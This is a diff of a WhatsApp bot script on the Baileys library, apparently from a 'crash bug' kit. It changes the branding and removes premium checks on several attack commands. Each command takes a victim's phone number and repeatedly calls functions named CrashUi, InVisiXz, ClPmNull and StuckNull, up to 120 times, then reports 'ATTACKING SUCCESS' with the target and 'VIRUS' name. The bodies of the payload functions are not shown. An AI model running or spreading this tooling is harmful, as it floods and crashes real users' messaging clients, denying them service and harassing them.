@@ -6104,7 +8760,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6115,7 +8771,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗜𝗩𝗦 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘`,
@@ -6132,7 +8788,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
@@ -6148,15 +8804,14 @@ break
 			}
 			break
 			case 'suxoinfinity': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -6164,12 +8819,12 @@ break
 					zreply(`*𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮⚡*`)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 5; i++) {
-						await ZnX(X, "P", 1020000, Ptcp = true)
-						await ClPmNull(X, null, GetsuZo, cct = true, ptcp = true)
-						await ClPmNull(X, null, GetsuZo, cct = true, ptcp = true)
-						await ZnX(X, nick.sss, 350000, Ptcp = true)
-						await ZnX(X, nick.sss, 800000, Ptcp = true)
-						await ZnX(X, nick.sss, 800000, Ptcp = true)
+						await ZnX(X, "P", 1020000, Ptcp = false)
+						await ClPmNull(X, null, GetsuZo, cct = false, ptcp = false)
+						await ClPmNull(X, null, GetsuZo, cct = false, ptcp = false)
+						await ZnX(X, nick.sss, 350000, Ptcp = false)
+						await ZnX(X, nick.sss, 800000, Ptcp = false)
+						await ZnX(X, nick.sss, 800000, Ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -6185,7 +8840,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6196,7 +8851,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗦𝗤𝗟 𝘅 𝗖𝗥𝗟 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘`,
@@ -6213,7 +8868,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
@@ -6229,15 +8884,14 @@ break
 			}
 			break
 			case 'invisixinfinite': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : InVisiXInfinite Number_\n_Example : InVisiXInfinite 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : InVisiXInfinite Number_\n_Example : InVisiXInfinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Infinite Number_\n_Example : Infinite 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -6245,7 +8899,7 @@ break
 					zreply(`*𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮⚡*`)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 20; i++) {
-						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
+						await InVisiXz(X, GetsuZo, cct = false, ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -6261,7 +8915,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6272,7 +8926,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗜𝗡𝗩𝗜𝗦𝗜𝗫 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘`,
@@ -6289,7 +8943,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
@@ -6305,15 +8959,14 @@ break
 			}
 			break
 			case 'invisixflods': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : InVisiXflods Number_\n_Example : InVisiXflods 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : InVisiXflods Number_\n_Example : InVisiXflods 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : InVisiXflods Number_\n_Example : InVisiXflods 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : InVisiXflods Number_\n_Example : InVisiXflods 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -6321,7 +8974,7 @@ break
 					zreply(`*𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮⚡*`)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 120; i++) {
-						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
+						await InVisiXz(X, GetsuZo, cct = false, ptcp = false)
 						await sleep(5000)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
@@ -6338,7 +8991,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6349,7 +9002,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗜𝗡𝗩𝗜𝗦𝗜𝗫 𝗢𝗩𝗗`,
@@ -6366,7 +9019,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
@@ -6382,15 +9035,14 @@ break
 			}
 			break
 			case 'flodui': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Flodui Number_\n_Example : Flodui 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Flodui Number_\n_Example : Flodui 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Flodui Number_\n_Example : Flodui 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Flodui Number_\n_Example : Flodui 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -6398,7 +9050,7 @@ break
 					zreply(`*𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙄𝙣𝙛𝙞𝙣𝙞𝙩𝙮⚡*`)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 100; i++) {
-						await CrashUi(X, GetsuZo, cct = true, ptcp = true)
+						await CrashUi(X, GetsuZo, cct = false, ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -6414,7 +9066,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6425,7 +9077,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗨𝗜 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘`,
@@ -6442,7 +9094,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
@@ -6458,15 +9110,14 @@ break
 			}
 			break
 			case 'znxivs': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ZnxIvs Number_\n_Example : ZnxIvs 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ZnxIvs Number_\n_Example : ZnxIvs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ZnxIvs Number_\n_Example : ZnxIvs 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ZnxIvs Number_\n_Example : ZnxIvs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -6474,7 +9125,7 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await ZnXIvS(X, Ptcp = true)
+						await ZnXIvS(X, Ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -6490,7 +9141,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6501,7 +9152,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗥𝗟 𝗫 𝗦𝗤𝗟`,
@@ -6518,7 +9169,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"Infinite ${incTarget}\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Infinite ${incTarget}\"}`
 										}, ],
 									})
 								})
@@ -6534,15 +9185,14 @@ break
 			}
 			break
 			case 'invisix': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : InVisiX Number_\n_Example : InVisiX 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : InVisiX Number_\n_Example : InVisiX 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : InVisiX Number_\n_Example : InVisiX 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : InVisiX Number_\n_Example : InVisiX 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -6550,9 +9200,9 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await ClPmNull(X, null, GetsuZo, cct = true, ptcp = true)
-						await ClPm(X, GetsuZo, cct = true, ptcp = true)
-						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
+						await ClPmNull(X, null, GetsuZo, cct = false, ptcp = false)
+						await ClPm(X, GetsuZo, cct = false, ptcp = false)
+						await InVisiXz(X, GetsuZo, cct = false, ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -6568,7 +9218,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6579,7 +9229,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤`,
@@ -6596,7 +9246,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"invisixinfinite ${incTarget}\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"invisixinfinite ${incTarget}\"}`
 										}, ],
 									})
 								})
@@ -6612,15 +9262,14 @@ break
 			}
 			break
 			case 'vasion': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : VaSion Number_\n_Example : VaSion 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : VaSion Number_\n_Example : VaSion 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : VaSion Number_\n_Example : VaSion 62xx_\n\nn𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : VaSion Number_\n_Example : VaSion 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -6628,9 +9277,9 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await StuckNull(X, GetsuZo, Ptcp = true)
-						await ClPm(X, GetsuZo, cct = true, ptcp = true)
-						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
+						await StuckNull(X, GetsuZo, Ptcp = false)
+						await ClPm(X, GetsuZo, cct = false, ptcp = false)
+						await InVisiXz(X, GetsuZo, cct = false, ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -6646,7 +9295,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6657,7 +9306,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
